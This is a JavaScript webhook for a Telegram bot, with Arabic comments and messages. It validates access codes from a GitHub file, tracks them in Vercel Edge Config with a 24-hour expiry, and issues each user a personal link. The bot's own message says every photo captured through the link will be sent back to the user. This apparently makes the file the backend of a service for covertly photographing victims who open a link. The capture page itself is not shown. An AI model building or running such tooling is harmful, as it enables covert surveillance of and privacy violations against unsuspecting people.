// api/webhook.js — VANTA for WORM
// منطق بوت @Saleckbz_cam_bot

const REPO = 'donot10/Camera';
const CFG_ID = 'ecfg_zbll1dzm8gtafcyor7sebjlcsaxha';

// قراءة الرموز من GitHub
async function loadCodes() {
  try {
    const r = await fetch(
      'https://raw.githubusercontent.com/' + REPO + '/main/codes.json?t=' + Date.now()
    );
    return await r.json();
  } catch (e) {
    return {};
  }
}

// قراءة حالة الاستخدام من Edge Config
async function loadState() {
  const CONFIG_URL = process.env.GLOBAL_CONFIG;
  if (!CONFIG_URL) return {};
  try {
    const r = await fetch(CONFIG_URL);
    const data = await r.json();
    return data.state || {};
  } catch (e) {
    return {};
  }
}

// حفظ حالة الاستخدام في Edge Config
async function saveState(state) {
  const TOKEN = process.env.VERCEL_TOKEN;
  if (!TOKEN) return false;
  try {
    const r = await fetch(
      'https://api.vercel.com/v1/edge-config/' + CFG_ID + '/items',
      {
        method: 'PATCH',
        headers: {
          'Authorization': 'Bearer ' + TOKEN,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          items: [
            { operation: 'upsert', key: 'state', value: state }
          ]
        })
      }
    );
    return r.ok;
  } catch (e) {
    return false;
  }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(200).send('OK');
    return;
  }

  const TG_TOKEN = process.env.TG_TOKEN;
  if (!TG_TOKEN) {
    res.status(500).json({ ok: false, err: 'no token' });
    return;
  }

  let update;
  try {
    update = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
  } catch (e) {
    res.status(200).send('OK');
    return;
  }

  const msg = update && update.message;
  if (!msg || !msg.text) {
    res.status(200).send('OK');
    return;
  }

  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'صديق';

  const OWNER_TG = 'Saleck_bz';

  async function send(chat, message, replyMarkup) {
    const body = { chat_id: chat, text: message, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  }

  // ============ /start ============
  if (text === '/start' || text === '/help') {
    await send(chatId,
      '👋 أهلاً ' + name + '!\n\n' +
      '🎁 للحصول على <b>رمز خاص</b> يعمل لمدة 24 ساعة:\n' +
      'تواصل مع صاحب البوت:\n\n' +
      '📱 تلغرام: <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
    );
    res.status(200).send('OK');
    return;
  }

  const code = text.toUpperCase().replace(/\s/g, '');

  if (code.length < 4 || code.length > 30) {
    await send(chatId, '❌ أرسل رمزاً صحيحاً.');
    res.status(200).send('OK');
    return;
  }

  const codes = await loadCodes();

  if (!codes[code]) {
    await send(chatId,
      '❌ <b>هذا الرمز غير صحيح</b>\n\n' +
      'احصل على رمز من صاحب البوت:\n' +
      '📱 <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
    );
    res.status(200).send('OK');
    return;
  }

  const state = await loadState();
  const entry = state[code];

  // هل استُخدم من شخص آخر؟
  if (entry && entry.chatId && entry.chatId !== chatId) {
    await send(chatId,
      '❌ <b>هذا الرمز مستخدم بالفعل.</b>\n\n' +
      'احصل على رمز جديد:\n' +
      '📱 <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
    );
    res.status(200).send('OK');
    return;
  }

  // هل انتهت مدته؟
  if (entry && entry.expiry && Date.now() > entry.expiry) {
    await send(chatId,
      '⏰ <b>انتهت صلاحية الرمز (24 ساعة).</b>\n\n' +
      'احصل على رمز جديد:\n' +
      '📱 <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
    );
    res.status(200).send('OK');
    return;
  }

  // تفعيل الرمز (أول مرة أو تجديد)
  const expiry = Date.now() + (24 * 60 * 60 * 1000);
  state[code] = { chatId: chatId, expiry: expiry, name: name };
  await saveState(state);

  const link = 'https://camera-one-henna.vercel.app/t/' + code;

  await send(chatId,
    '✅ <b>تم تفعيل رمزك!</b>\n\n' +
    '🔗 رابطك الخاص:\n' +
    '<code>' + link + '</code>\n\n' +
    '⏱️ صالح لمدة <b>24 ساعة</b>\n' +
    '📸 كل صورة تُلتقط عبر الرابط ستصلك هنا.',
    {
      inline_keyboard: [[
        { text: '📋 نسخ الرابط', url: link }
      ]]
    }
  );

  res.status(200).send('OK');
}
